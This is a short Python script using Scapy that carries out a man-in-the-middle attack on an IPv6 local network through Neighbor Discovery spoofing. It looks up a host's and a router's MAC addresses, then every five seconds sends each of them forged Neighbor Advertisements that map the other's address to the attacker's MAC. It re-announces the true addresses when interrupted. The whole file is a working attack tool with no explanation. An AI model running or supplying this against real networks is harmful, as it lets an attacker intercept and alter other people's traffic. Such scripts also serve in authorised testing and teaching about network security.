#! /usr/bin/env python
'''
MitM on IPv6 using ND
'''

from scapy.all import *
from time import *

def get_if_ip6(interface):
	lst = in6_getifaddr()
	l = filter(lambda x: x[2] == interface, lst)[0][0]
	return l

hostip6='fe80::dead'
routerip6='fe80::beef'
interface='eth0'

spoofip6 = get_if_ip6(interface)
spoofmac = get_if_hwaddr(interface) 

a = neighsol(routerip6, spoofip6, interface) 
if a and a.haslayer(ICMPv6NDOptDstLLAddr): 
	routermac = a.getlayer(ICMPv6NDOptDstLLAddr).lladdr 
else: 
	print "Couldn't find MAC for:",routerip6 
	exit(1) 

a = neighsol(hostip6, spoofip6, interface) 
if a and a.haslayer(ICMPv6NDOptDstLLAddr): 
	hostmac = a.getlayer(ICMPv6NDOptDstLLAddr).lladdr 
else: 
	print "Couldn't find MAC for:",hostip6 
	exit(1) 

NA_to_host = Ether(src=spoofmac,dst=hostmac) 
NA_to_host /= IPv6(src=routerip6,dst=hostip6) 
NA_to_host /= ICMPv6ND_NA(R=1,S=1,O=1,tgt=routerip6) 
NA_to_host /= ICMPv6NDOptDstLLAddr(type=2,len=1,lladdr=spoofmac) 

NA_to_router = Ether(src=spoofmac,dst=routermac) 
NA_to_router /= IPv6(src=hostip6,dst=routerip6) 
NA_to_router /= ICMPv6ND_NA(R=0,S=1,O=1,tgt=hostip6)
NA_to_router /= ICMPv6NDOptDstLLAddr(type=2,len=1,lladdr=spoofmac)

try:
	while 1:
		sendp(NA_to_host, iface=interface, verbose=0)
		sendp(NA_to_router, iface=interface, verbose=0)
		sleep(5)
except:
	NA_to_host.getlayer(ICMPv6NDOptDstLLAddr).lladdr=routermac
	NA_to_router.getlayer(ICMPv6NDOptDstLLAddr).lladdr=hostmac
	sendp(NA_to_host, iface=interface, verbose=0)
	sendp(NA_to_router, iface=interface, verbose=0)

